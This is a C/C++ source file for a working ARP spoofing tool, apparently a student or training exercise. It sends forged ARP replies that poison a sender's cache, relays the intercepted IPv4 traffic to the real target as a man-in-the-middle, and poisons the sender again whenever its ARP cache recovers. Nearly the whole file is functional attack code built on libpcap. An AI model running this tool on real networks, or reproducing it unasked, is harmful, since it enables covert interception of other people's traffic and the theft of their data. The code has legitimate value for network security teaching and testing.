#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h> 
#include <sys/socket.h>
#include <sys/types.h>

#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <pcap.h>

#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"

#include "arpspoof.h"

#define MAC_ALEN 6

Mac my_Mac;
Ip my_Ip;

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Session
{
    Ip   senderIp;
    Mac  senderMac;
    Ip   targetIp;
    Mac  targetMac;
    EthArpPacket arpInfectPacket;
};

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}


void makeInfectPacket(Session* session)
{
    session->arpInfectPacket.eth_.dmac_ = session->senderMac;
    session->arpInfectPacket.eth_.smac_ = my_Mac;
    session->arpInfectPacket.eth_.type_ = htons(EthHdr::Arp);

    session->arpInfectPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    session->arpInfectPacket.arp_.pro_ = htons(EthHdr::Ip4);
    session->arpInfectPacket.arp_.hln_ = Mac::SIZE;
    session->arpInfectPacket.arp_.pln_ = Ip::SIZE;
    session->arpInfectPacket.arp_.op_ = htons(ArpHdr::Reply);  
    session->arpInfectPacket.arp_.smac_ = my_Mac;
    session->arpInfectPacket.arp_.sip_ = htonl(session->targetIp);  
    session->arpInfectPacket.arp_.tmac_ = session->senderMac;
    session->arpInfectPacket.arp_.tip_ = htonl(session->senderIp);
}

int main(int argc, char* argv[]) {
	
    clock_t start, end;

	if ((argc%2)!=0 || argc < 4) 
    {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
    my_Mac=GetMyMacAddr(dev);
    my_Ip=GetMyIp(dev);

	printf("My Mac Addr: %s\n",my_Mac.operator std::string().c_str());
	printf("My Ip Addr: %s\n",my_Ip.operator std::string().c_str()); //c_str: exchange string to char*

    const int flowNum = (argc-2) / 2; // number of <sender,target> group(session)
    printf("Number of session: %d\n", flowNum);

    Session* session = new Session[flowNum];// give memory to session new is same as malloc
   
    for(int i = 2; i < argc; i+=2) //Push senderIp, targetIp to session[i]
    {
        session[(i/2)-1].senderIp = Ip(argv[i]);
        session[(i/2)-1].targetIp = Ip(argv[i+1]);
    
    }

    for(int i = 0; i < flowNum; i++) //Push senderMac, targetMac to session[i]
    {
        session[i].senderMac = GetMacFromIP(handle, session[i].senderIp);
        session[i].targetMac = GetMacFromIP(handle, session[i].targetIp);
        makeInfectPacket(&session[i]);
    }
    
    for(int i = 0; i < flowNum; i++)
    {
    printf("-------------------------------------------------------------\n");
    printf("[Session %d] Made and Ready\n",i);
    printf("[Session %d] sender IP : %s\n",i,session[i].senderIp.operator std::string().c_str());
    printf("[Session %d] target IP : %s\n",i,session[i].targetIp.operator std::string().c_str());
    printf("[Session %d] sender Mac: %s\n",i,session[i].senderMac.operator std::string().c_str());
    printf("[Session %d] target Mac: %s\n",i,session[i].targetMac.operator std::string().c_str());
    printf("-------------------------------------------------------------\n");
    }
    

    for(int i = 0; i < flowNum; i++) //send InfectPacket to sender
    {
        int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>( &(session[i].arpInfectPacket) ),sizeof(EthArpPacket));
        if (res != 0) 
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
            printf("Session %d Infect Success\n",i);
    }


	while(true)
    {
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        //Get all packet
        EthHdr*      spoofedPacket = (EthHdr*)packet;
        bpf_u_int32  spoofedPacketSize = header->caplen;

        for(int i = 0; i < flowNum; i++)
        {
            
            if(spoofedPacket->smac() == session[i].senderMac && spoofedPacket->dmac() == my_Mac && spoofedPacket->type() == EthHdr::Ip4)
            {
                //send relay packet!!!!!!!!!!!!!!!!!
                spoofedPacket->dmac_ = session[i].targetMac;
                spoofedPacket->smac_ = my_Mac;

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofedPacket), spoofedPacketSize);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }

               printf("Session %d Spoofed IP packet is relayed\n",i);
            }

            // if sender recovers we can know by getting ARP broadcast packet
            else if(spoofedPacket->type() == EthHdr::Arp)
            {
                // reinfect the sender!!!!!!!!!!!!!!!!!!
                res = pcap_sendpacket(
                    handle,
                    reinterpret_cast<const u_char*>( &(session[i].arpInfectPacket) ),
                    sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }

                printf("Sender has recoverd from infection Resend infect packet\n");
            }
        }
    }
    delete[] session;
    session = nullptr;
    pcap_close(handle);
}
